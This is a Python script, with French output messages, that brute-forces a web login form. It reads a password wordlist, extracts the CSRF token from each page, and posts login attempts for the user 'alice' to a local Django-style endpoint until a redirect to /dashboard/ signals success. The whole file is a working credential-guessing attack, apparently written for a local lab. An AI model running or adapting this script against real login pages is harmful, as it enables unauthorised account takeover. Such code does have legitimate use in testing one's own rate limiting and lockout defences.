import requests

URL = "http://127.0.0.1:8000/login/"
USERNAME = "alice"
WORDLIST = "passwords.txt"

def get_csrf(session):
    response = session.get(URL)
    for line in response.text.split('\n'):
        if 'csrfmiddlewaretoken' in line:
            debut = line.find('value="') + 7
            fin = line.find('"', debut)
            return line[debut:fin]
    return None

def brute_force():
    print(f"Attaque sur le compte : {USERNAME}")
    print(f"Fichier de mots de passe : {WORDLIST}")
    print("-" * 40)

    with open(WORDLIST, 'r') as f:
        mots_de_passe = f.read().splitlines()

    session = requests.Session()

    for mdp in mots_de_passe:
        csrf = get_csrf(session)

        data = {
            'username': USERNAME,
            'password': mdp,
            'csrfmiddlewaretoken': csrf,
        }

        headers = {
            'Referer': URL
        }

        response = session.post(URL, data=data, headers=headers, allow_redirects=False)

        if response.status_code == 302 and '/dashboard/' in response.headers.get('Location', ''):
            print(f"[TROUVE] Mot de passe : {mdp}")
            return
        else:
            print(f"[ECHEC]  {mdp}")

    print("-" * 40)
    print("Mot de passe non trouvé.")

brute_force()